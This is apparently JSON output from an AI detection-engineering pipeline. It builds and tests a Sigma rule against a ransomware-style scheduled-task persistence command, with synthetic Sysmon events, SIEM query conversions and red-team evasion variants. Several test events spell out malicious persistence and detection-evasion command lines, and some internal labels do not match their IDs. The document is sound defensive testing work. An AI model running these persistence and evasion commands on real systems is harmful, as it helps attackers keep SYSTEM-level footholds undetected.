+      "sigma_yaml": "title: SchTasks Creates WindowsUpdateHealth Task With Kstrl.Exe From PerfLogs\nid: d3aafe3e-5b25-49c6-949e-90cd28dcfab9\nstatus: experimental\ndescription: 'Detects creation of a scheduled task named ''WindowsUpdateHealth'' via schtasks.exe that executes kstrl.exe\n  from C:\\PerfLogs, indicative of Kestrel ransomware persistence behavior.'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.persistence\n- attack.t1053.005\nlogsource:\n  category: process_creation\n  product: windows\n  service: sysmon\ndetection:\n  selection:\n    'Image|endswith': '\\schtasks.exe'\n    'CommandLine|contains|all':\n    - /create\n    - '/tn \"WindowsUpdateHealth\"'\n    - '/tr \"C:\\\\PerfLogs\\\\kstrl.exe'\n    - /sc onstart\n    - /ru SYSTEM\n  condition: selection\nfalsepositives:\n- Legitimate administrative use of schtasks.exe with unrelated task names or targets.\nlevel: high\n",
+      "status": "needs_review",
+      "attack_technique_ids": [
+        "T1053.005"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Positive event: schtasks creating WindowsUpdateHealth task with kstrl.exe from PerfLogs as observed in attack.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /s FS-02 /create /tn \"WindowsUpdateHealth\" /tr \"C:\\PerfLogs\\kstrl.exe -path C:\\ -no-net\" /sc onstart /ru SYSTEM /f",
+            "Computer": "HOST01",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c2d}",
+            "ProcessId": "3456",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:30:00.000"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Positive variant: different casing in task name and command line switches.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /create /TN \"WindowsUpdateHealth\" /TR \"C:\\PerfLogs\\kstrl.exe\" /SC ONSTART /RU SYSTEM /F",
+            "Computer": "HOST02",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\powershell.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c2e}",
+            "ProcessId": "4567",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:31:00.000"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Positive variant: using SysWOW64 schtasks.exe on 64-bit system.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /create /tn \"WindowsUpdateHealth\" /tr \"C:\\PerfLogs\\kstrl.exe -path C:\\ -no-net\" /sc onstart /ru SYSTEM /f",
+            "Computer": "HOST03",
+            "EventID": 1,
+            "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c2f}",
+            "ProcessId": "5678",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:32:00.000"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Negative event: legitimate schtasks creating a benign update task not related to malware.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /create /tn \"WindowsUpdateAutomation\" /tr \"C:\\Windows\\System32\\wuauclt.exe /detectnow\" /sc daily /ru SYSTEM",
+            "Computer": "HOST04",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\mmc.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c30}",
+            "ProcessId": "6789",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:33:00.000"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Negative event: schtasks creating a task with similar name but pointing to legitimate binary.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /create /tn \"WindowsUpdateHealth\" /tr \"C:\\Windows\\System32\\svchost.exe -k netsvcs\" /sc onstart /ru SYSTEM",
+            "Computer": "HOST05",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\services.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c31}",
+            "ProcessId": "7890",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:34:00.000"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Negative event: non-system user creating a personal scheduled task.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /create /tn \"MyBackupTask\" /tr \"C:\\Users\\JohnDoe\\Scripts\\backup.bat\" /sc weekly /ru JohnDoe",
+            "Computer": "HOST06",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\Explorer.EXE",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c32}",
+            "ProcessId": "8901",
+            "User": "CORP\\JohnDoe",
+            "UtcTime": "2024-06-12 14:35:00.000"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "Positive evasion: all flags uppercase, single quotes around task name and task run, extra whitespace, parameter reordering, additional /rl highest /v1 flags.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe  /CREATE   /TN  'WindowsUpdateHealth'   /TR  'C:\\PerfLogs\\kstrl.exe -path C:\\ -no-net'   /SC  ONSTART   /RU  SYSTEM   /RL  HIGHEST   /V1   /F",
+            "Computer": "HOST04",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\pwsh.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c30}",
+            "ProcessId": "6789",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:33:00.000"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Positive evasion: 8.3 short path for PerfLogs directory (PerfLog~1), mixed-case flags, no quotes on task name, double quotes on task run.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /create /tn WindowsUpdateHealth /tr \"C:\\PerfLog~1\\kstrl.exe\" /sc onstart /ru SYSTEM /f",
+            "Computer": "HOST05",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\cscript.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c31}",
+            "ProcessId": "7890",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:34:00.000"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "Positive evasion: environment variable %SystemDrive% expanded to C:, UNC-style local path \\\\localhost\\C$\\PerfLogs\\kstrl.exe, flags in different order, extra /f at start.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /f /ru SYSTEM /create /tn \"WindowsUpdateHealth\" /tr \"\\\\localhost\\C$\\PerfLogs\\kstrl.exe -path C:\\ -no-net\" /sc onstart",
+            "Computer": "HOST06",
+            "EventID": 1,
+            "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\rundll32.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c32}",
+            "ProcessId": "8901",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:35:00.000"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "Positive evasion: task name with mixed case 'windowsupdatehealth', flags abbreviated where possible (/tn->/taskname not valid, but /tn is shortest), extra spaces, parent is wscript.exe from alternate LOLBin.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /create /tn \"windowsupdatehealth\" /tr \"C:\\PerfLogs\\kstrl.exe\" /sc onstart /ru SYSTEM /f",
+            "Computer": "HOST07",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c33}",
+            "ProcessId": "9012",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:36:00.000"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "positive",
+          "description": "Positive evasion: copied schtasks.exe to temp folder but OriginalFileName metadata still shows schtasks.exe (sensor records Image as copied path, rule uses Image|endswith).",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /create /tn \"WindowsUpdateHealth\" /tr \"C:\\PerfLogs\\kstrl.exe -path C:\\ -no-net\" /sc onstart /ru SYSTEM /f",
+            "Computer": "HOST08",
+            "EventID": 1,
+            "Image": "C:\\Users\\Public\\AppData\\Local\\Temp\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c34}",
+            "ProcessId": "1234",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:37:00.000"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Benign: admin creating legitimate Windows Update health check task pointing to Microsoft signed binary, different task run path.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /create /tn \"WindowsUpdateHealth\" /tr \"C:\\Windows\\System32\\wuauclt.exe\" /sc onstart /ru SYSTEM /f",
+            "Computer": "HOST10",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c35}",
+            "ProcessId": "2345",
+            "User": "CORP\\admin",
+            "UtcTime": "2024-06-12 14:40:00.000"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Benign: SCCM/Intune agent creating a task with schtasks.exe for configuration compliance, different task name and binary.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /create /tn \"ConfigComplianceCheck\" /tr \"C:\\Program Files\\Microsoft Configuration Manager\\ComplianceRunner.exe\" /sc daily /ru SYSTEM /f",
+            "Computer": "HOST11",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c36}",
+            "ProcessId": "3456",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:41:00.000"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "Benign: legitimate software installer (Veeam Backup) creating a scheduled task for its own service using schtasks.exe.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "schtasks.exe /create /tn \"VeeamBackupService\" /tr \"C:\\Program Files\\Veeam\\Backup\\Veeam.Backup.Service.exe\" /sc onstart /ru SYSTEM /f",
+            "Computer": "HOST12",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c37}",
+            "ProcessId": "4567",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:42:00.000"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D5",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE Image LIKE '%\\\\schtasks.exe' ESCAPE '\\' AND (CommandLine LIKE '%/create%' ESCAPE '\\' AND CommandLine LIKE '%/tn \"WindowsUpdateHealth\"%' ESCAPE '\\' AND CommandLine LIKE '%/tr \"C:\\\\PerfLogs\\\\kstrl.exe%' ESCAPE '\\' AND CommandLine LIKE '%/sc onstart%' ESCAPE '\\' AND CommandLine LIKE '%/ru SYSTEM%' ESCAPE '\\')",
+        "issues": [
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test R1 did not match: Positive evasion: all flags uppercase, single quotes around task name and task run, extra whitespace, parameter reordering, additional /rl highest /v1 flags.. Per selection: selection=NO MATCH (failing field tests: CommandLine|contains|all (event has \"schtasks.exe  /CREATE   /TN  'WindowsUpdateHealth'   /TR  'C\"))."
+          },
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test R2 did not match: Positive evasion: 8.3 short path for PerfLogs directory (PerfLog~1), mixed-case flags, no quotes on task name, double quotes on task run.. Per selection: selection=NO MATCH (failing field tests: CommandLine|contains|all (event has 'schtasks.exe /create /tn WindowsUpdateHealth /tr \"C:\\\\PerfLog'))."
+          },
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test R3 did not match: Positive evasion: environment variable %SystemDrive% expanded to C:, UNC-style local path \\\\localhost\\C$\\PerfLogs\\kstrl.exe, flags in different order, extra /f at start.. Per selection: selection=NO MATCH (failing field tests: CommandLine|contains|all (event has 'schtasks.exe /f /ru SYSTEM /create /tn \"WindowsUpdateHealth\"'))."
+          }
+        ],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": false,
+            "passed": false
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": false,
+            "passed": false
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": false,
+            "passed": false
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 8,
+        "positives_matched": 5,
+        "negatives_total": 6,
+        "negatives_matched": 0,
+        "benign_total": 1200,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": false
+      },
+      "conversions": {
+        "splunk": "Image=\"*\\\\schtasks.exe\" CommandLine=\"*/create*\" CommandLine=\"*/tn \\\"WindowsUpdateHealth\\\"*\" CommandLine=\"*/tr \\\"C:\\\\PerfLogs\\\\kstrl.exe*\" CommandLine=\"*/sc onstart*\" CommandLine=\"*/ru SYSTEM*\"",
+        "elasticsearch": "Image:*\\\\schtasks.exe AND (CommandLine:*\\/create* AND CommandLine:*\\/tn\\ \\\"WindowsUpdateHealth\\\"* AND CommandLine:*\\/tr\\ \\\"C\\:\\\\PerfLogs\\\\kstrl.exe* AND CommandLine:*\\/sc\\ onstart* AND CommandLine:*\\/ru\\ SYSTEM*)",
+        "kusto": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\schtasks.exe\" and (ProcessCommandLine contains \"/create\" and ProcessCommandLine contains \"/tn \\\"WindowsUpdateHealth\\\"\" and ProcessCommandLine contains \"/tr \\\"C:\\\\PerfLogs\\\\kstrl.exe\" and ProcessCommandLine contains \"/sc onstart\" and ProcessCommandLine contains \"/ru SYSTEM\")",
+        "sqlite": "SELECT * FROM logs WHERE Image LIKE '%\\\\schtasks.exe' ESCAPE '\\' AND (CommandLine LIKE '%/create%' ESCAPE '\\' AND CommandLine LIKE '%/tn \"WindowsUpdateHealth\"%' ESCAPE '\\' AND CommandLine LIKE '%/tr \"C:\\\\PerfLogs\\\\kstrl.exe%' ESCAPE '\\' AND CommandLine LIKE '%/sc onstart%' ESCAPE '\\' AND CommandLine LIKE '%/ru SYSTEM%' ESCAPE '\\')"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 0/3, negatives blocked 3/3, benign hits 0/1200",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/1200",
+          "passed": true,
+          "change_summary": "Updated the Image check to accept both System32 and SysWOW64 paths by using endswith instead of equality, ensuring coverage across 32-bit and 64-bit execution contexts while maintaining specificity to schtasks.exe binaries."
+        },
+        {
+          "iteration": 1,
+          "phase": "redteam",
+          "summary": "8 evasion variants -> positives 5/8, negatives blocked 6/6, benign hits 0/1200",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 2,
+          "phase": "refine",
+          "summary": "positives 0/8, negatives blocked 6/6, benign hits 0/1200",
+          "passed": false,
+          "change_summary": "Changed quote handling and path escaping in CommandLine|contains|all to allow both single/double quotes and handle escaped backslashes correctly by using unquoted substrings without slash escapes in the match patterns."
+        },
+        {
+          "iteration": 2,
+          "phase": "revert",
+          "summary": "positives 5/8, negatives blocked 6/6, benign hits 0/1200",
+          "passed": false,
+          "change_summary": "Last refinement regressed; kept the best earlier draft."
+        }
+      ],
+      "author_notes": "The rule focuses on the distinctive combination of task name 'WindowsUpdateHealth', target binary kstrl.exe from PerfLogs, and execution parameters (/sc onstart /ru SYSTEM). False positives are minimized by requiring all these elements together. Test events cover variants in casing, path (SysWOW64), and parent processes while negative events reflect legitimate schtasks usage that lacks the malicious combination.",
+      "redteam_analysis": "The six positive variants (P4-P8) exercise realistic operator evasions: flag casing changes, quoting styles (single/double/none), whitespace padding, parameter reordering, 8.3 short names (PerfLog~1), UNC local paths (\\\\localhost\\C$), environment-variable-style paths, extra flags (/rl highest /v1), alternate parent LOLBins (pwsh, cscript, rundll32, wscript), and a copied schtasks.exe that still ends with the target filename. A well-written rule using case-insensitive contains checks on the command line and an endswith on Image will catch all of them. The three negative variants (N1-N3) show legitimate administrative, SCCM, and installer activity that shares the binary and some flags but differs in the task name or task run path, ensuring the rule's specificity. The three out-of-scope variants (OOS1-OOS3) represent fundamental blind spots of this logsource: a renamed binary (rule keys on Image), direct DLL invocation via rundll32.exe, and pure PowerShell COM-based task registration—none spawn schtasks.exe, so the rule cannot see them. These are recorded for the analyst to consider complementary rules (e.g., on task registration events or DLL loads).",
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Out of scope: attacker renames schtasks.exe to stask.exe and runs it; rule keys on Image|endswith '\\schtasks.exe' so renamed binary evades detection.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "stask.exe /create /tn \"WindowsUpdateHealth\" /tr \"C:\\PerfLogs\\kstrl.exe\" /sc onstart /ru SYSTEM /f",
+            "Computer": "HOST20",
+            "EventID": 1,
+            "Image": "C:\\Windows\\Temp\\stask.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c38}",
+            "ProcessId": "5678",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:45:00.000"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Out of scope: attacker uses rundll32.exe to load schtasks.dll entry point directly, no schtasks.exe process appears.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "rundll32.exe C:\\\\Windows\\\\System32\\schtasks.dll,CreateTask \"WindowsUpdateHealth\" \"C:\\\\PerfLogs\\\\kstrl.exe\"",
+            "Computer": "HOST21",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "ParentImage": "C:\\Windows\\System32\\powershell.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c39}",
+            "ProcessId": "6789",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:46:00.000"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Out of scope: attacker uses PowerShell Register-ScheduledTask cmdlet (no schtasks.exe process), creates same task via COM.",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "powershell.exe -NoProfile -Command \"$a=New-ScheduledTaskAction -Execute 'C:\\PerfLogs\\kstrl.exe'; $t=New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName 'WindowsUpdateHealth' -Action $a -Trigger $t -User 'SYSTEM' -RunLevel Highest -Force\"",
+            "Computer": "HOST22",
+            "EventID": 1,
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ProcessGuid": "{7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c40}",
+            "ProcessId": "7890",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:47:00.000"
+          }
+        }
+      ]
+    }
+  ],
+  "metrics": {
+    "calls": [
+      {
+        "stage": "extract",
+        "tier": "fast",
+        "model": "nvidia/Nemotron-3_5-Lightning",
+        "prompt_tokens": 4020,
+        "completion_tokens": 3190,
+        "latency_s": 10.745,
+        "cost_usd": 0.001007,
+        "thinking": false
+      },
+      {
+        "stage": "plan",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 5469,
+        "completion_tokens": 6611,
+        "latency_s": 20.637,
+        "cost_usd": 0.025302,
+        "thinking": true
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3404,
+        "completion_tokens": 822,
+        "latency_s": 4.778,
+        "cost_usd": 0.001761,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3523,
+        "completion_tokens": 978,
+        "latency_s": 5.053,
+        "cost_usd": 0.001937,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3520,
+        "completion_tokens": 1045,
+        "latency_s": 5.564,
+        "cost_usd": 0.001997,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3510,
+        "completion_tokens": 270,
+        "latency_s": 2.032,
+        "cost_usd": 0.001296,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4124,
+        "completion_tokens": 355,
+        "latency_s": 2.355,
+        "cost_usd": 0.001557,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3363,
+        "completion_tokens": 367,
+        "latency_s": 2.421,
+        "cost_usd": 0.001339,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4124,
+        "completion_tokens": 361,
+        "latency_s": 2.09,
+        "cost_usd": 0.001562,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4123,
+        "completion_tokens": 356,
+        "latency_s": 2.153,
+        "cost_usd": 0.001557,
+        "thinking": false
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 1936,
+        "completion_tokens": 3387,
+        "latency_s": 11.136,
+        "cost_usd": 0.012097,
+        "thinking": true
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2126,
+        "completion_tokens": 5517,
+        "latency_s": 16.157,
+        "cost_usd": 0.018677,
+        "thinking": true
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2141,
+        "completion_tokens": 2923,
+        "latency_s": 9.023,
+        "cost_usd": 0.01091,
+        "thinking": true
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 5819,
+        "completion_tokens": 394,
+        "latency_s": 2.377,
+        "cost_usd": 0.0021,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3613,
+        "completion_tokens": 1763,
+        "latency_s": 7.928,
+        "cost_usd": 0.002671,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3613,
+        "completion_tokens": 2368,
+        "latency_s": 10.55,
+        "cost_usd": 0.003215,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4351,
+        "completion_tokens": 286,
+        "latency_s": 1.949,
+        "cost_usd": 0.001563,
+        "thinking": false
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2428,
+        "completion_tokens": 4195,
+        "latency_s": 11.836,
+        "cost_usd": 0.015013,
+        "thinking": true
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2762,
+        "completion_tokens": 5293,
+        "latency_s": 13.851,
+        "cost_usd": 0.018641,
+        "thinking": true
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4467,
+        "completion_tokens": 272,
+        "latency_s": 2.029,
+        "cost_usd": 0.001585,
+        "thinking": false
+      }
+    ]
+  },
+  "models": {
+    "fast": "nvidia/Nemotron-3_5-Lightning",
+    "main": "nvidia/nemotron-3-super-120b-a12b",
+    "reasoning": "nvidia/Nemotron-3-Ultra-550b-a55b"
+  },
+  "warnings": []
+}
